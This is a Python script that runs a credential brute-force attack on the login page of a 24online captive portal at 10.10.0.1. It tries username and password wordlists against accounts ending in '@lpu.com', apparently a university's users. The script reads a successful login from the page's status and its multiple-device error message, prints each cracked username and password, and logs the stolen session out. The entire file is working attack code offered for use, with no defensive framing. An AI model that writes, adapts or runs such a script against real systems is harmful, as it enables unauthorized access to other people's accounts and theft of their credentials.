import requests
import urllib
from requests_html import HTMLSession
from settings import *
import fileinput
import time
import math


print('Preparing for attack...')

session = requests.Session()
response = session.get(URL)
cookie = session.cookies.get_dict()['JSESSIONID']

time.sleep(5)

session = HTMLSession()
r = session.get(URL)

sel = "FORM > INPUT"
fetched_params = r.html.find(sel, first=False)

params = {}

users = list(user.rstrip('\n') for user in fileinput.input('users.txt'))
passwords = list(password.rstrip('\n') for password in fileinput.input('small.txt'))


def calc_content_length(param):
    return len(urllib.parse.urlencode(param))


def get_header():
    global cookie
    global params
    header = {
        'HOST': '10.10.0.1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Referer': 'http://10.10.0.1/24online/webpages/clientlogin.jsp?loginstatus=null&logoutstatus=null&message=null&liverequesttime=null&livemessage=null&url=null&isAccessDenied=null&fromlogout=true&sessionTimeout=null&ipaddress=null&username=null&formsubmiturlIP=null&alerttime=null&deviceType=COMPUTER&ajaxusername=null&autologin=false',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': str(calc_content_length(params)),
        'Cookie': '_UserName={}@lpu.com; JSESSIONID={}'.format(params['username'], cookie)
    }

    return header


def find_between(s, first, last ):
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return ""


def get_logout_header(l_referer, logout_param):
    global cookie
    header = {
        'HOST': '10.10.0.1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Referer': 'http://10.10.0.1' + l_referer,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': str(calc_content_length(logout_param)),
        'Cookie': '_UserName={}; _Pass=; JSESSIONID={}'.format(params['username'], cookie)
    }

    return header


def logout(l_referer, username):
    l_params = {}

    res = session.get('http://10.10.0.1' + l_referer)
    logout_param_select = "FORM > INPUT"
    logout_param = res.html.find(logout_param_select, first=False)

    for each_p in logout_param:
        l_params[each_p.attrs['name']] = each_p.attrs['value']

    l_params['username'] = username
    l_params['logout'] = 'Logout'
    l_params['saveinfo'] = ''
    l_params['mode'] = 193
    l_params['checkClose'] = 1
    l_params['sessionTimeout'] = 514775
    l_params['chrome'] = 1
    l_params['popupalert'] = 1
    l_params['dtold'] = 1526728430043

    l_header = get_logout_header(l_referer + '&autologin=false', l_params)
    session.post(LOGIN_URL, data=l_params, headers=l_header)


if __name__ == "__main__":
    for each in fetched_params:
        params[each.attrs['name']] = each.attrs['value']

    found = False

    print('Brute-force attack started...')

    startTime = time.time()
    count = 0
    cracked = 0
    total_count = 0

    for user in users:
        for password in passwords:
            # Count number of attempts
            count += 1

            params['username'] = user + '@lpu.com'
            params['password'] = password

            response = session.post(LOGIN_URL, data=params, headers=get_header())

            select = "FRAMESET > FRAME"
            result = response.html.find(select, first=False)[1].attrs['src']
            referer = result

            status = find_between(result, 'loginstatus=', '&')
            message = find_between(result, 'message=', '&').replace('+', ' ').replace('%2F', ' & ').replace('%2C', ', ')

            if status == 'true':
                print('Login found: {', end="")
                print('Username: ' + params['username'] + '; Password: ' + params['password'] + '}')

                logout(referer, params['username'])

                print('The attack took {0} second(s) to finish!'.format(math.floor(time.time() - startTime)))
                print('Number of attempts: {}'.format(count))
                startTime = time.time()

                total_count += count
                count = 0
                cracked += 1
                found = True
                break
            else:
                if message == 'You are not allowed to logged in into multiple devices at same time, Disconnect your previous session before creating new session':
                    print('Login found: {', end="")
                    print('Username: ' + params['username'] + '; Password: ' + params['password'] + '}')

                    print('The attack took {0} second(s) to finish!'.format(math.floor(time.time() - startTime)))
                    print('Number of attempts: {}'.format(count))
                    startTime = time.time()

                    total_count += count
                    count = 0
                    cracked += 1
                    found = True
                    break

        if found:
            print('\nAttempting to brute-force other accounts\n')
            found = False

    print('Brute-force failed! A valid username and password could not be found.' if cracked == 0 else 'That\'s all I could find, enjoy!')

    print('Total time taken: {0}'.format(math.floor(time.time() - startTime)))
    print('Total number of attempts: {}'. format(max(count, total_count)))
